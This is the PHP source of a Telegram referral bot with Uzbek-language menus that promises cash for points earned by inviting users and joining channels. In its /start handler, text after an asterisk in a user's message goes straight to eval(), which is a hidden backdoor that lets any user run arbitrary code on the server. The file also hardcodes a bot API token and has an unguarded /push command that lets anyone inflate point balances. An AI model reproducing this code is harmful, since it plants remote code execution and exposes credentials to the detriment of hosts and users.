<?php
ob_start();
define('API_KEY','1927492511:AAG-xCPpy4hoT07ToRkmF_Ck3UNZj5lI6rs');
$admin = "1020652922"; 
$bot = "TFV_Nick_bot"; 
$kanalimz = "@sirlar"; 

   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
   }

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "coin/$cid.step";
$folder = "coin";
$folder2 = "azo";


if (!file_exists($folder.'/test.fd3')) {
  mkdir($folder);
  file_put_contents($folder.'/test.fd3', 'by @userkeremi');
}

if (!file_exists($folder2.'/test.fd3')) {
  mkdir($folder2);
  file_put_contents($folder2.'/test.fd3', 'by @userkeremi');
}

if (file_exists($filee)) {
  $step = file_get_contents($filee);
}

$name = $message->from->firstname;
$tx = $message->text;

$kun1 = date('z', strtotime('5 hour'));

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"➕Каналга кушилиб пул ишлаш"],],
[['text'=>"📈Ботга канал жойлаш"],],
[['text'=>"👤Реферал оркали пул ишлаш🎗"],],
[['text'=>"📊Статистика"],['text'=>" 📝Админ билан богланиш"],],
]
]);

$key2 = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"👥Реферал код"],['text'=>"💰Баланс"],],
[['text'=>"🔙 Оркага кайтиш"],],
]
]);

$key3 = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙Оркага кайтиш"],],
]
]);

$balinfo = "Пул ишлаш учун сиз балл йиғишингиз керак.\n ❓Балл қандай йиғилади?\n \n Биз ҳар бир фойдаланувчига стартни босганида маҳсус реферал код берамиз. Бу реферал код сизнинг даромад топишингизда асосий восида бўлиб ҳисобланади. Сиз ўша реферал кодни имкон қадар дўстларингизга тарқатишингиз керак бўлади. Агар, кимдир сиз тарқатган реферал код орқали ботимизга кириб стартни босса, сиз 1 баллга эга бўласиз. Балларни эса пулга алмаштириб олишингиз мумкин. \n \n100 балл = 4000 сум \n  200 балл = 8000сум \n 300 балл = 12.000 сум \n  400 балл = 16.000 сум \n  500 балл = 20.000 сум";

if((mb_stripos($tx,"/start")!==false) or ($tx == "Ortga")) {
  ty($cid);

  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
    $bgun = file_get_contents("bugun.$kun1");
    $bgun += 1;
    file_put_contents("bugun.$kun1",$bgun);
  }

  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,"$cid") !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Гирром килиш яхши эмас",
      ]);
    } else {

      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);

      $usr = file_get_contents("coin/$refid.dat");
      $usr = $usr + 1;
      file_put_contents("coin/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
      'text'=>"Сизга 1 балл берилди",
      ]);
    }
  }

  file_put_contents("coin/$cid.dat", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'text'=>$balinfo,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
  ]);
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    if($tx == "Реферал оркали пул ишлаш 🎗"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$balinfo,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    if($tx == "💰Баланс"){
      ty($cid);
      $ball = file_get_contents("coin/$cid.dat");
      $in = "💰Сизнинг балансингизда $ball балл мавжуд!";
      if($ball>=100) $in .= "\nПул ечиб олишингиз учун сизда етарли балл мавжуд! Ечиб оласизми?";
      if($ball>=100) $key2 = json_encode([
      'resize_keyboard'=>true,
      'keyboard'=>[
      [['text'=>"✅Ҳа"],['text'=>"❌Йўқ"],],
      [['text'=>"🔙Оркага кайтиш"],],
      ]
      ]);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$in,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    if($tx == "✅Ҳа"){
      ty($cid);
      $ball = file_get_contents("coin/$cid.dat");

      if($ball > 49){
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"Пайнет қилиш лозим бўлган телефон рақаминни ёзиб қолдиринг! 24 соат ичида пул тўланади!",
        'reply_to_message_id'=>$mid,
        'reply_markup'=>$key3,
        ]);
        file_put_contents("coin/$cid.step","nomer");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"😠Акиллилик килганинг учун сенга 10 балл штраф!",
        'reply_to_message_id'=>$mid,
        ]);
        $ball -=10;
        file_put_contents("coin/$cid.dat","$ball");
      }
    }

    else if($step == "nomer"){
      ty($cid);

      if($tx == "🔙Оркага кайтиш"){
        del("coin/$cid.step");
      }else{
        $ball = file_get_contents("coin/$cid.dat");
        $bali = file_get_contents("coin/$cid.dat");
        if($ball <= 100) $bali *= 35;
        else if($ball <= 200) $bali *= 35;
        else if($ball <= 300) $bali *= 35;
        else if($ball <= 400) $bali *= 35;
        else if($ball <= 500) $bali *= 35;
        bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>$tx."\n\nTushuradigon summayiz: $bali",
        ]);
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"Сиз, $ball баллни $bali сўмга алмашдингиз. Тез фурсатда $bali сўм пулингиз мобил рақамингизга ўтказилади.",
        'reply_markup'=>$key,
        ]);
        file_put_contents("coin/$cid.dat","0");
        del("coin/$cid.step");
      }
    }

    if($tx == "❌Йўқ"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Демак, балл йиғишда ишингизни давом эттиришингиз мумкин! Чунки, қанча балл кўп бўлса, пул миғдори ҳам шунча кўп бўлади. Омад!",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "🔙Оркага кайтиш"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$balinfo,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "👥Реферал код"){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"✅Сизнинг реферал кодингиз:\nhttps://telegram.me/$bot?start=$cid",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

    if($tx == "📊Статистика"){
      ty($cid);
      $eski = $kun1-1;
      del("bugun.$eski");
      $new = file_get_contents("bugun.$kun1");
      $baza = file_get_contents("coin.dat");
      $obsh = substr_count($baza,"\n");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"📈Статистика\n\n👥Ботимиз аъзолари: $obsh\n👤Янги аъзолар: $new",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "📝Админ билан богланиш"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Бот админи: @xonxacker \n Иш вакти: 13:00dan 21:00gacha  \n Профил: @xonxacker \n",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

if($tx == "📈Ботга канал жойлаш"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Ботга канал жойлаш оркали сиз озингизни каналингиздаги одам сонини копайтиришингиз мумкин! \n  
Жойламокчи болсангиз ✔️ @xonxacker",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    $replyik = $message->reply_to_message->text;
    $yubbi = "Yuboriladigon xabarni kiriting.";

    if($tx == "/send" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$yubbi,
      'reply_markup'=>$key3,
      ]);
      file_put_contents("coin/$cid.step","send");
    }

    if($step == "send" and $cid == $admin){
      ty($cid);
      if($tx == "🔙Оркага кайтиш"){
      del("coin/$cid.step");
      }else{
      ty($cid);
      $idss=file_get_contents("coin.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
      del("coin/$cid.step");
      }
    }

    if(stripos($tx,"/push")!==false){
      $ex=explode("_",$tx);
      $refid = $ex[1];
      $usr = file_get_contents("coin/$refid.dat");
      $usr += $ex[2];
      file_put_contents("coin/$refid.dat", "$usr");
    }

    $nocha = "Бошқа канал йўқ!";
    $noazo = "Сиз каналга аъзо бўлмадингиз.";
    $okcha = "Сиз каналга аъзо бўлдингиз ва 3 баллга эга бўлдингиз!
    3 кун ичида каналдан чиқиб кетсангиз сизни 3 балингиз олиб қўйилади.";

    if((stripos($tx,"/Kanal")!==false) and $cid == $admin){
      $ex=explode("=",$tx);
      file_put_contents("kanal.dat", "$ex[1]|$ex[2]|0");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"📣Канал: ".$ex[2]."\n👥Кераклик одам сони:".$ex[1]."\n❗️Бошка канал кошмай туринг. Бот канал кошиш мумкин деб ози айтиб беради сизга. Агар кошсангиз бот хисобдан адашиб кетадиб",
      'reply_markup'=>$key,
      ]);
    }

    if((stripos($tx,"/otmen")!==false) and $cid == $admin){
      unlink("kanal.dat");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Kanal o'chirildi!",
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "➕Каналга кушилиб пул ишлаш️"){
      ty($cid);
      $get = file_get_contents("kanal.dat");
      if($get){
        list($odam,$kanal,$now) = explode("|",$get);
        if($odam == $now){
        unlink("kanal.dat");
        bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>"✅Канал кошишиз мумкин",
        'reply_markup'=>$key,
        ]);
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
        }else{
        file_put_contents("coin/$cid.step","chek");
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"📣$kanal - каналига кошилинг ва текшириш тугмасини босинг",
        'reply_markup'=>json_encode([
        'resize_keyboard'=>true,
        'keyboard'=>[
        [['text'=>"✅Текшириш"],],
        ]
        ]),
        ]);
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
      }
    }

    if($tx == "✅Текшириш"){
      del("coin/$cid.step");
      $get = file_get_contents("kanal.dat");
      if($get){

        list($odam,$kanal,$now) = explode("|",$get);
        $tekshir = file_get_contents("azo/$cid.$kanal");

        if($tekshir){
          bot('sendMessage',[
          'chat_id'=>$cid,
          'text'=>"☝️Сиз олдин бу каналда бор эдингиз!",
          'reply_markup'=>$key,
          ]);
        }else{
          $get = file_get_contents("kanal.dat");
          list($odam,$kanal,$now) = explode("|",$get);
          $gett = bot('getChatMember',[
          'chat_id' => $kanal,
          'user_id' => $cid,
          ]);
          $gget = $gett->result->status;

          if($gget == "member"){
            $time = date('d', strtotime('5 hour'));
            $test = file_put_contents("azo/$cid.$kanal", "$kanal|$cid|$time");
            if ($test) {
              $now += 1;
              file_put_contents("kanal.dat", "$odam|$kanal|$now");
              $kabin = file_get_contents("coin/$cid.dat");
              $kabi = $kabin + 3;
              file_put_contents("coin/$cid.dat", "$kabi");
              bot('sendMessage',[
              'chat_id'=>$cid,
              'text'=>$okcha,
              'reply_markup'=>$key,
              ]);
            } else {
              bot('sendMessage',[
              'chat_id'=>$cid,
              'text'=>'Qaytadan urunib kuring, xatolik aniqlandi',
              'reply_markup'=>$key,
              ]);
            }

          }else{
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>$noazo,
            'reply_markup'=>$key,
            ]);
          }
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>$nocha,
        'reply_markup'=>$key,
        ]);
      }
    }

    if(isset($tx)){
      $baza = file_get_contents("coin.dat");

      if(mb_stripos($baza, $cid) !== false){ 
      }else{
        $baza = file_get_contents("coin.dat");
        $dat = "$baza\n$cid";
        file_put_contents("coin.dat", $dat);
      }
      $faylla = glob("azo/*.*");

      foreach($faylla as $fayl){
        $geti = file_get_contents("$fayl");
        list($chati,$usri,$ftime) = explode("|",$geti);
        $nowtime = date('d', strtotime('-72 hour'));
        if($ftime < $nowtime){
        unlink("$fayl");
        }else{
        $gett = bot('getChatMember',[
        'chat_id' => $chati,
        'user_id' => $usri,
        ]);
        $gget = $gett->result->status;
        if($gget != "member"){
        bot('sendMessage',[
        'chat_id'=>$usri,
        'text'=>"😠Сиз $chati каналидан 3 кун болмасидан олдин чикиб кетганиз учун сиздан 3 балл айриб ташлаймиз!",
        'reply_markup'=>$key,
        ]);
        $kabin = file_get_contents("coin/$usri.dat");
        $ball = $kabin - 3;
        file_put_contents("coin/$usri.dat", "$ball");
        unlink("$fayl");
        }
        }
      }
    }
  } else{
    bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"📣Сиз хозирда $kanalimz каналига азо булмагансиз. Илтимос каналга азо булинг ва кейин ботни ишлатишигиз мумкин!\n❗️Агарда каналга азо булмаган холатда ботга одам чакирсангиз бот у одам учун сизга бот балл бермайди.",
    ]);
  }
}
?>
